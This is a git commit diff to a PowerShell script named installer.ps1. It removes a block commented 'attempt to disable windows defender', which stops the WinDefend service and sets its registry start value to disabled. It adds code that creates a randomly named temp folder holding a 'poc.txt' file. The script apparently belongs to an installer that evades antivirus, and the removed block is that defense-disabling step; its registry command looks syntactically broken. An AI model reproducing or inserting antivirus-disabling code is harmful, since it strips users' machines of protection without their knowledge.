9283ce224b0e3a46ead85b02d7c0a14c8fca0df9
Promite <36072396+Promite@users.noreply.github.com>
2022-06-21 12:37:32 +1000

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -1,14 +1,17 @@
+#builds resources
+#
+
 #random string for directories
 function random_text {
-    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {
-        [char]$_})
+    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
     }
 
-#attempt to disable windows defender
-try {
-    Get-Service WinDefend | Stop-Service -Force
-    Set-ItemProperty -Path
-    "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start"
-    -Value 4 -Type DWORD -Force
-    }
+#variable
+$wd = random_text
+$path = "$env:temp/$wd"
+echo $path
 
+# go to temp, make working directory
+mkdir $path
+cd $path
+echo "" > poc.txt
